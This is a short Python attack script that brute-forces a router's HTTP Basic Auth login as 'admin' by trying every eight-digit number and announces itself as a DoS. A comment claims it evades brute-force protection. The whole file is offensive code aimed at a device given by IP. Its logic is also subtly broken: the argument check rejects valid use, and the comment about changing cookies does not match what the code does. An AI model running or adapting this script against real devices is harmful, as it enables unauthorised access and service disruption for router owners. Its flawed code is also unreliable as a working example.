import requests
import base64
import sys

def createWordList():
    a = list(range(10000000,100000000))
    return a

def main(URL, code, mode=True):
        #change cookie after every request to evade brute force protection
        for num in code:
            encode_num = "admin:"+str(num)
            encode_num = encode_num.encode("ascii")
            encode_num = base64.b64encode(encode_num)
            encode_num = encode_num.decode('ascii')
            print(encode_num)
            req = requests.get(URL+str(num), headers={"Authorization": "Basic "+encode_num}, verify=False)
            if mode:
                print("Trying "+str(num))
                print(req.status_code)
            if req.status_code != 300:
                print("Login page is down.")
                break

if __name__ == "__main__":
    if len(sys.argv) != 1:
        print("Use: " + sys.argv[0] + " ROUTER_IP_ADDRESS")
        exit(1)
    else:
        IP = sys.argv[1]
        print("Generating numbers...this might take a while")
        nums = createWordList()
        URL = "http://"+IP+"/AuthChk?_="     #change this
        print("Numbers generated, DoS starting...")
        main(URL, nums)
